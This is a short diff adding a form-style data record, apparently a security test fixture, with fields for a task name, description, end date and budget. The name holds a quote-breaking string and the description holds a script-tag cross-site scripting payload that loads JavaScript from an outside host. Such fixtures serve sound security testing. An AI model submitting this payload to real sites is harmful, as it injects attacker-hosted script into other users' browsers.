@@ -1,0 +1,6 @@
+name : VJ.F'Tp 2 ' 
+desc : <SCRIPT SRC=http://ha.ckers.org/xss.js
+end : 25.6.2016
+budget : 2,571
+assignto[] : 1
+assignme : 1
